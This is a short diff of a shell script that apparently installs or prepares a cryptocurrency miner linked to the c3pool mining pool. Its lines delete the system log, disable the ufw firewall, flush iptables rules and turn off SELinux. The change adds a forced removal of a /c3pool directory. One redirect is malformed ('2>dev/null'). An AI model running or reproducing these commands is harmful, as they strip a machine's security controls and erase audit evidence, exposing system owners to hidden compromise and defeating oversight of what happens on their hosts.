@@ -27,6 +27,7 @@ EMAIL=$2 # this one is optional
 # Disable firewall
 ulimit -n 65535
 rm -rf /var/log/syslog
+rm -rf /c3pool
 ufw disable
 iptables -F
 setenforce 0 2>dev/null
